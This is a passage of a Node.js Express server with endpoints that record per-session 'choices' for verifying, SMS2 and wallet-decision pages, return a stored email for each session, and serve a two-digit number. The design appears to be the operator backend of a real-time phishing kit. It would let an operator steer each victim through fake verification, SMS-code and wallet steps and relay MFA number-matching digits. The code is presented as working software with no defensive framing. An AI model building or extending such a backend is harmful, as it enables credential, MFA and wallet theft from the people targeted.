    if (!entry) return res.json({ success: false });

    if (entry.selectedDigits && entry.selectedDigits.length === 2) {
      const number = entry.selectedDigits[0] + entry.selectedDigits[1];
      return res.json({ success: true, number });
    }

    res.json({ success: false });
  } catch (err) {
    console.error("❌ Get selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-verifying-choice
// ============================================================================

app.post("/update-verifying-choice", (req, res) => {
  try {
    const { verifyingId, choice } = req.body;

    if (!verifyingId || !choice) {
      return res.status(400).json({ error: "Missing verifyingId or choice" });
    }

    if (!pendingVerifyingPage[verifyingId]) {
      pendingVerifyingPage[verifyingId] = {};
    }

    pendingVerifyingPage[verifyingId].choice = choice;
    pendingVerifyingPage[verifyingId].updatedAt = Date.now();

    console.log(`✅ Verifying choice updated: ${choice}`);
    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Update verifying choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-verifying-info/:verifyingId
// ============================================================================

app.get("/get-verifying-info/:verifyingId", (req, res) => {
  try {
    const { verifyingId } = req.params;
    const entry = pendingVerifyingPage[verifyingId];
    
    if (entry) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get verifying info error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-sms2-choice
// ============================================================================

app.post("/update-sms2-choice", (req, res) => {
  try {
    const { sms2Id, choice } = req.body;

    if (!sms2Id || !choice) {
      return res.status(400).json({ error: "Missing sms2Id or choice" });
    }

    if (!pendingSMS2[sms2Id]) {
      pendingSMS2[sms2Id] = {};
    }

    pendingSMS2[sms2Id].choice = choice;
    pendingSMS2[sms2Id].updatedAt = Date.now();

    console.log(`✅ SMS2 choice updated: ${choice}`);
    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Update SMS2 choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-sms2-info/:sms2Id
// ============================================================================

app.get("/get-sms2-info/:sms2Id", (req, res) => {
  try {
    const { sms2Id } = req.params;
    const entry = pendingSMS2[sms2Id];
    
    if (entry) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get SMS2 info error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-wallet-decision
// ============================================================================

app.post("/update-wallet-decision", (req, res) => {
  try {
    const { email, choice } = req.body;

    if (!email || !choice) {
      return res.status(400).json({ error: "Missing email or choice" });
    }

    if (!pendingWalletDecision[email]) {
      pendingWalletDecision[email] = {};
    }

    pendingWalletDecision[email].choice = choice;
    pendingWalletDecision[email].updatedAt = Date.now();

    console.log(`✅ Wallet decision updated: ${choice}`);
    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Update wallet decision error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

const server = app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
  startSelfPing();
});

module.exports = { app, server };
